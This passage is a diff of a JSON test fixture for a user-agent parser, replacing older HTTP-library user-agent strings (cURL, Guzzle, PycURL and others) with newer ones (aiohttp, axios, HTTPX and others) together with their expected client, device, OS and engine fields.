-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "aiohttp",
-      "modus": null,
-      "version": "0.7.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.4.30 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.4.24 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.4.27 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "sqlmap/1.0-dev (http://sqlmap.org)"
+      "user-agent": "sqlmap/1.8.10.1#dev (https://sqlmap.org)"
     },
     "device": {
       "architecture": "",
@@ -1915,7 +385,7 @@
     "client": {
       "name": "sqlmap",
       "modus": null,
-      "version": "1.0.0-dev",
+      "version": "1.8.10.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -1936,7 +406,7 @@
   },
   {
     "headers": {
-      "user-agent": "curl/7.34.0"
+      "user-agent": "vimeo.php 3.0.8; (http://developer.vimeo.com/api/docs)"
     },
     "device": {
       "architecture": "",
@@ -1958,9 +428,9 @@
       "bits": 0
     },
     "client": {
-      "name": "cURL",
+      "name": "vimeo.php",
       "modus": null,
-      "version": "7.34.0",
+      "version": "3.0.8",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -1981,7 +451,7 @@
   },
   {
     "headers": {
-      "user-agent": "Typhoeus - http://github.com/dbalatero/typhoeus/tree/master"
+      "user-agent": "Apidog/1.0.0 (https://apidog.com)"
     },
     "device": {
       "architecture": "",
@@ -2003,9 +473,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Typhoeus",
+      "name": "Apidog",
       "modus": null,
-      "version": null,
+      "version": "1.0.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2026,7 +496,7 @@
   },
   {
     "headers": {
-      "user-agent": "node-superagent/0.18.0"
+      "user-agent": "BIC Tracker"
     },
     "device": {
       "architecture": "",
@@ -2048,97 +518,7 @@
       "bits": 0
     },
     "client": {
-      "name": "superagent",
-      "modus": null,
-      "version": "0.18.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Guzzle/3.8.0 curl/7.24.0 PHP/5.4.22"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Guzzle Http Client",
-      "modus": null,
-      "version": "3.8.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.3.16 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
+      "name": "BIC Tracker",
       "modus": null,
       "version": null,
       "manufacturer": "unknown",
@@ -2161,7 +541,7 @@
   },
   {
     "headers": {
-      "user-agent": "HTMLParser/1.6"
+      "user-agent": "Lodestone PHP Parser"
     },
     "device": {
       "architecture": "",
@@ -2183,232 +563,7 @@
       "bits": 0
     },
     "client": {
-      "name": "HTML Parser",
-      "modus": null,
-      "version": "1.6.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "OOCurl 0.3"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "0.3.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "HTTPClient/1.0 (2.3.4.1, ruby 1.9.3 (2013-06-27))"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "ruby",
-      "modus": null,
-      "version": "1.9.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.32.0 (Jappy-Link-Checker; http://www.jappy.de/infos/linkChecker)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.32.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "FDM 2.x"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Free Download Manager",
-      "modus": null,
-      "version": "2.0.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Curl/PHP 5.4.25 (http://github.com/shuber/curl)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
+      "name": "Lodestone PHP Parser",
       "modus": null,
       "version": null,
       "manufacturer": "unknown",
@@ -2431,7 +586,7 @@
   },
   {
     "headers": {
-      "user-agent": "curl/7.28.1"
+      "user-agent": "Hubot/13.1.4"
     },
     "device": {
       "architecture": "",
@@ -2453,9 +608,9 @@
       "bits": 0
     },
     "client": {
-      "name": "cURL",
+      "name": "Hubot",
       "modus": null,
-      "version": "7.28.1",
+      "version": "13.1.4",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2476,7 +631,7 @@
   },
   {
     "headers": {
-      "user-agent": "aria2/1.15.1"
+      "user-agent": "Python/3.11 aiohttp/3.13.5"
     },
     "device": {
       "architecture": "",
@@ -2498,9 +653,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Aria2",
+      "name": "aiohttp",
       "modus": null,
-      "version": "1.15.1",
+      "version": "3.13.5",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2521,7 +676,7 @@
   },
   {
     "headers": {
-      "user-agent": "http-get/v0.5.10 (https://github.com/SaltwaterC/http-get) node.js/v0.10.25"
+      "user-agent": "python-httpx/0.28.1 (SumbleBot/1.0)"
     },
     "device": {
       "architecture": "",
@@ -2543,9 +698,9 @@
       "bits": 0
     },
     "client": {
-      "name": "http-get",
+      "name": "HTTPX",
       "modus": null,
-      "version": null,
+      "version": "0.28.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2566,7 +721,7 @@
   },
   {
     "headers": {
-      "user-agent": "Faraday v0.8.9"
+      "user-agent": "Python/3.13 aiohttp/3.14.1"
     },
     "device": {
       "architecture": "",
@@ -2588,9 +743,9 @@
       "bits": 0
     },
     "client": {
-      "name": "Faraday",
+      "name": "aiohttp",
       "modus": null,
-      "version": "0.8.9",
+      "version": "3.14.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2611,7 +766,7 @@
   },
   {
     "headers": {
-      "user-agent": "Mozilla/5.0 (compatible; U; AnyEvent-HTTP/1.46; +http://software.schmorp.de/pkg/AnyEvent)"
+      "user-agent": "axios/1.17.0"
     },
     "device": {
       "architecture": "",
@@ -2633,144 +788,9 @@
       "bits": 0
     },
     "client": {
-      "name": "AnyEvent HTTP",
+      "name": "Axios",
       "modus": null,
-      "version": "1.46.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "http-get/v0.5.10 (https://github.com/SaltwaterC/http-get) node.js/v0.10.6"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "http-get",
-      "modus": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.3.1 libcurl/7.30.0 SecureTransport zlib/1.2.5"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.3.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Mechanize/2.7.2 Ruby/1.9.3p0 (http://github.com/sparklemotion/mechanize/)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Mechanize",
-      "modus": null,
-      "version": "2.7.2",
+      "version": "1.17.0",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2791,7 +811,7 @@
   },
   {
     "headers": {
-      "user-agent": "http-get/v0.5.10 (https://github.com/SaltwaterC/http-get) node.js/v0.10.22"
+      "user-agent": "KlHttpClientCurl/30.1895.0.970"
     },
     "device": {
       "architecture": "",
@@ -2813,9 +833,9 @@
       "bits": 0
     },
     "client": {
-      "name": "http-get",
+      "name": "KlHttpClientCurl",
       "modus": null,
-      "version": null,
+      "version": "30.1895.0.970",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -2836,367 +856,7 @@
   },
   {
     "headers": {
-      "user-agent": "PycURL/7.23.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.23.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.3 libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.3",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "WWW-Mechanize/1.72"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "WWW-Mechanize",
-      "modus": null,
-      "version": "1.72.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.25.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.25.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.22.0 (Jappy-Link-Checker; http://www.jappy.de/infos/linkChecker)"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.22.0",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "PycURL/7.19.0.2 libcurl/7.22.0"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "PycURL",
-      "modus": null,
-      "version": "7.19.0.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "http.rb/2.2.2"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "http.rb",
-      "modus": null,
-      "version": "2.2.2",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.55.0-DEV"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.55.0-dev",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python/3.6 aiohttp/2.2.3"
+      "user-agent": "Python/3.12 aiohttp/3.14.1"
     },
     "device": {
       "architecture": "",
@@ -3220,7 +880,7 @@
     "client": {
       "name": "aiohttp",
       "modus": null,
-      "version": "2.2.3",
+      "version": "3.14.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3241,142 +901,7 @@
   },
   {
     "headers": {
-      "user-agent": "GuzzleHttp/6.1.1 curl/7.54.1 PHP/7.1.7"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "Guzzle Http Client",
-      "modus": null,
-      "version": "6.1.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "node-superagent/3.3.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "superagent",
-      "modus": null,
-      "version": "3.3.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "curl/7.49.1"
-    },
-    "device": {
-      "architecture": "",
-      "deviceName": null,
-      "marketingName": null,
-      "manufacturer": "unknown",
-      "brand": "unknown",
-      "display": {
-        "width": null,
-        "height": null,
-        "touch": false,
-        "size": null
-      },
-      "type": "unknown",
-      "ismobile": false,
-      "istv": false,
-      "dualOrientation": null,
-      "simCount": 0,
-      "bits": 0
-    },
-    "client": {
-      "name": "cURL",
-      "modus": null,
-      "version": "7.49.1",
-      "manufacturer": "unknown",
-      "type": "library",
-      "isbot": false,
-      "bits": 0
-    },
-    "os": {
-      "name": null,
-      "marketingName": null,
-      "version": null,
-      "manufacturer": "unknown",
-      "bits": 0
-    },
-    "engine": {
-      "name": null,
-      "version": null,
-      "manufacturer": "unknown"
-    }
-  },
-  {
-    "headers": {
-      "user-agent": "Python/3.5 aiohttp/2.0.2"
+      "user-agent": "Python/3.14 aiohttp/3.14.1"
     },
     "device": {
       "architecture": "",
@@ -3400,7 +925,7 @@
     "client": {
       "name": "aiohttp",
       "modus": null,
-      "version": "2.0.2",
+      "version": "3.14.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3421,7 +946,7 @@
   },
   {
     "headers": {
-      "user-agent": "PHP-Curl-Class/7.2.0 (+https://github.com/php-curl-class/php-curl-class) PHP/7.0.19-1 curl/7.52.1"
+      "user-agent": "Python/3.11 aiohttp/3.14.1"
     },
     "device": {
       "architecture": "",
@@ -3443,9 +968,9 @@
       "bits": 0
     },
     "client": {
-      "name": "PHP cURL Class",
+      "name": "aiohttp",
       "modus": null,
-      "version": "7.2.0",
+      "version": "3.14.1",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3466,7 +991,7 @@
   },
   {
     "headers": {
-      "user-agent": "GuzzleHttp/6.2.1 curl/7.37.1 PHP/7.1.6"
+      "user-agent": "axios/1.15.0"
     },
     "device": {
       "architecture": "",
@@ -3488,9 +1013,54 @@
       "bits": 0
     },
     "client": {
-      "name": "Guzzle Http Client",
+      "name": "Axios",
       "modus": null,
-      "version": "6.2.1",
+      "version": "1.15.0",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": "WebKit",
+      "version": null,
+      "manufacturer": "apple"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Python/3.11 aiohttp/3.11.13"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aiohttp",
+      "modus": null,
+      "version": "3.11.13",
       "manufacturer": "unknown",
       "type": "library",
       "isbot": false,
@@ -3511,7 +1081,322 @@
   },
   {
     "headers": {
-      "user-agent": "Faraday v0.13.1"
+      "user-agent": "Python/3.14 aiohttp/3.14.0"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
+        "size": null
+      },
+      "type": "unknown",
+      "ismobile": false,
+      "istv": false,
+      "dualOrientation": null,
+      "simCount": 0,
+      "bits": 0
+    },
+    "client": {
+      "name": "aiohttp",
+      "modus": null,
+      "version": "3.14.0",
+      "manufacturer": "unknown",
+      "type": "library",
+      "isbot": false,
+      "bits": 0
+    },
+    "os": {
+      "name": null,
+      "marketingName": null,
+      "version": null,
+      "manufacturer": "unknown",
+      "bits": 0
+    },
+    "engine": {
+      "name": null,
+      "version": null,
+      "manufacturer": "unknown"
+    }
+  },
+  {
+    "headers": {
+      "user-agent": "Python/3.14 aiohttp/3.13.4"
+    },
+    "device": {
+      "architecture": "",
+      "deviceName": null,
+      "marketingName": null,
+      "manufacturer": "unknown",
+      "brand": "unknown",
+      "display": {
+        "width": null,
+        "height": null,
+        "touch": false,
